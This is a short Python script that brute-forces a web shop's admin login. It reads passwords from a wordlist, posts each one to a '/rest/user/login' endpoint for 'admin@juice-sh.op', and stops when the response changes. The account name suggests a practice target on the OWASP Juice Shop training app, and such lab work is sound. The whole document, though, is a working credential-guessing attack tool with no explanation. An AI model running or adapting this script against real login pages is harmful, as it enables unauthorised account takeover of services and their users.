import requests

EMAIL = "admin@juice-sh.op"

file = open('wordlist.txt', 'r')
WORDLIST = file.readlines()

for word in WORDLIST:
    word = word.strip()
    print(word)
    login = {"email":EMAIL, "password":word}
    response = requests.post("http://shop.bancocn.com/rest/user/login", json=login)
    if response.text.strip() != "Invalid email or password.":
        print(f"{response.text} >>> EMAIL: {EMAIL} | PASSWORD: {word}")
        break
